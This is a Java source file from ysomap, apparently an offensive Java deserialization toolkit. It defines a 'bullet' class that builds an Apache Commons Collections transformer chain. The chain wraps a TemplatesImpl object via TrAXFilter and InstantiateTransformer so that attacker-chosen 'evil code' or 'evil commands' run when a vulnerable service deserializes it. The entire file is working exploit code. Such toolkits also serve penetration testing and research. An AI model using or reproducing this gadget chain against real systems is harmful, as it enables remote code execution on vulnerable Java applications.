package ysomap.core.gadget.bullet.collections;

import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import ysomap.annotation.Authors;
import ysomap.annotation.Bullets;
import ysomap.annotation.Dependencies;
import ysomap.annotation.Require;
import ysomap.core.ObjectGadget;
import ysomap.core.gadget.bullet.jdk.TemplatesImplBullet;

import javax.xml.transform.Templates;
import java.util.LinkedList;

/**
 * @author wh1t3P1g
 * @since 2020/2/17
 */
@SuppressWarnings({"rawtypes"})
@Bullets
@Dependencies({"jdk.xml.enableTemplatesImplDeserialization=true"})
@Authors({ Authors.WH1T3P1G })
public class TransformerWithTemplatesImplBullet extends AbstractTransformerBullet {

    @Require(name = "args" ,detail = "evil code (start with 'code:') or evil commands")
    public String args;

    @Require(name="version", type="int", detail = "commons-collections version, plz choose 3 or 4")
    public String version = "3";// 默认生成commonscollections 3.2.1

    @Override
    public Object getObject() throws Exception {
        initClazz(version);
        ObjectGadget tplBullet = new TemplatesImplBullet();
        tplBullet.set("body", args);
        Object obj = tplBullet.getObject();
        LinkedList<Object> transformers = new LinkedList<>();
        transformers.add(createConstantTransformer(TrAXFilter.class));
        transformers.add(createInstantiateTransformer(new Class[] { Templates.class },
                                                        new Object[] { obj } ));
        return createTransformerArray(transformers);
    }



}
